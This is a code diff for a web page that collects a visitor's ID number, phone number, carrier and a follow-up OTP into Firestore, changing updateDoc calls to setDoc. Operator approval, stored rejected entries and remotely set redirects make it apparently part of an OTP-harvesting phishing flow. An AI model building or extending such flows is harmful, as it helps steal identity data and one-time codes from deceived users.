@@ -13,7 +13,7 @@ import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
 import { PhoneOtpDialog } from "@/components/dialog-b"
 
-import { db, updateDoc, doc } from "@/lib/firebase"
+import { db, setDoc, doc } from "@/lib/firebase"
 import { onSnapshot, getDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -54,7 +54,7 @@ export default function VerifyPhonePage() {
       
       // Clear any old redirectPage to prevent unwanted navigation
       const visitorRef = doc(db, "pays", visitorId)
-      updateDoc(visitorRef, {
+      setDoc(visitorRef, {
         redirectPage: null
       }).catch(err => console.error("[phone-info] Failed to clear redirectPage:", err))
     }
@@ -170,7 +170,7 @@ export default function VerifyPhonePage() {
 
     try {
       // Save ID number, phone number and carrier to Firebase
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         phoneIdNumber: idNumber,
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
@@ -178,7 +178,7 @@ export default function VerifyPhonePage() {
         _v4Status: "pending", // Set to pending for admin approval
         phoneUpdatedAt: new Date().toISOString(),
         redirectPage: null // Clear any old redirect
-      })
+      }, { merge: true })
 
       // Don't add to history yet - will add after OTP entry
       // Open Phone OTP Dialog directly
@@ -225,7 +225,7 @@ export default function VerifyPhonePage() {
         }
         
         // Save rejected phone data and reset status
-        await updateDoc(docRef, {
+        await setDoc(docRef, {
           oldPhoneInfo: data.oldPhoneInfo ? [...data.oldPhoneInfo, currentPhoneData] : [currentPhoneData],
           phoneOtpStatus: "pending",
           phoneCarrier: "" // Clear carrier to allow re-selection
